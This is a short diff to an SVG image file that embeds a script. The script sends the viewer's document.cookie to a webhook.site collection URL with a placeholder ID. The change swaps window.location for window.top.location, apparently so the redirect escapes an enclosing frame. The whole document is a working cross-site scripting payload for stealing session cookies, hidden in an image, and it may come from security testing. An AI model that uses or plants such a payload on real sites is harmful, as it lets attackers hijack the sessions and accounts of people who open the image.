@@ -1,6 +1,6 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
-    window.location = "https://webhook.site/YOUR-ID?cookie=" + document.cookie;
+    window.top.location = "https://webhook.site/YOUR-ID?cookie=" + document.cookie;
   </script>
 </svg>
 
